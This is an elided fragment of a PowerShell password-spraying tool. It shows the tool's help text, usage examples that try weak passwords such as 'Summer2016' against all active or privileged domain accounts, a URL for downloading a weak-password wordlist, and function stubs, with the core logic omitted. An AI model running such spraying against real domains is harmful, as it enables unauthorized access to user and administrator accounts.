<#
  ...
  .PARAMETER Pass
    ...
    Eg. -Pass 'Password1,Password2'. Do not use together with File or Url."
	
  .PARAMETER File
    Supply a path to a password input file to test multiple passwords for each
    targeted user account. Do not use together with Pass or Url.
	
  .PARAMETER Url
    Download file from given URL and use as password input file to test multiple
    passwords for each targeted user account. Do not use together with File or Pass.
  ...
  .EXAMPLE
    ...
    Test the password 'Summer2016' against all active user accounts,
    except privileged user accounts (admincount=1).

  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins
    Test the password 'Summer2016' against all active user accounts,
    including privileged user accounts (admincount=1).

  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -File .\passwords.txt -Verbose 

    1. Test each password in the file 'passwords.txt' against all active
       user accounts, except privileged user accounts (admincount=1).
    2. Output script progress/status information to console.

  .EXAMPLE
    PS C:\> .\Spray-Passwords.ps1 -Url "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/utils/rockme.txt" -Verbose
    
    1. Download the password file with weak passwords.
    2. Test each password against all active user accounts,
       except privileged user accounts (admincount=1).
...
Write-Host "`n"
Write-Host "[START]: Password spraying attack!" -ForegroundColor Green
...
Function Get-Duration
{
    ...
    Write-Verbose "Lockout duration is: $duration attempts."
    Return $duration
}
...
Function Get-UserObjects
{
    ...
    Try{
       ...
       Write-Host "[ERROR]: None domain account(s) found, quitting .." -ForegroundColor Red -BackgroundColor Black
       Write-Host "";Exit
    }
